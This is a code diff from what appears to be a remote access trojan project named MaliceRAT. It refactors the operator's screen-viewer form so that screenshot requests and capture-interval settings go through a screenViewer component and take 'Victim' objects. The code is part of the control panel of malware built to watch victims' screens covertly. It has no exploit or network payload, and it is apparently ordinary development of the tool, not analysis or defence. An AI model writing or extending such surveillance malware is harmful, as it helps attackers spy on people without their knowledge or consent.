@@ -16,7 +16,7 @@ namespace MaliceRAT.RatUI
             this.clientId = clientId;
             this.server = server;
             
-            server.ScreenshotReceived += UpdateScreenImage;
+            server.screenViewer.ScreenshotReceived += UpdateScreenImage;
 
             Victim victim = server.GetVictimById(clientId);
             titleLabel.Text = "Screen viewer [" + (victim != null ? victim.User : "Unknown") + "]";
@@ -32,24 +32,24 @@ namespace MaliceRAT.RatUI
 
         private void StopButton_Click(object sender, EventArgs e)
         {
-            server.SetScreenUpdateInterval(clientId, 0);
+            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), 0);
         }
 
         private void ScreenViewForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            server.SetScreenUpdateInterval(clientId, 0);
+            server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), 0);
         }
 
         private void UpdateButton_Click(object sender, EventArgs e)
         {
-            server.RequestScreenshot(clientId);
+            server.screenViewer.RequestScreenshot(server.GetVictimById(clientId));
         }
 
         private void UpdateIntervalButton_Click(object sender, EventArgs e)
         {
             if (int.TryParse(intervalTextBox.Text, out int interval))
             {
-                server.SetScreenUpdateInterval(clientId, interval);
+                server.screenViewer.SetScreenUpdateInterval(server.GetVictimById(clientId), interval);
             }
             else
             {
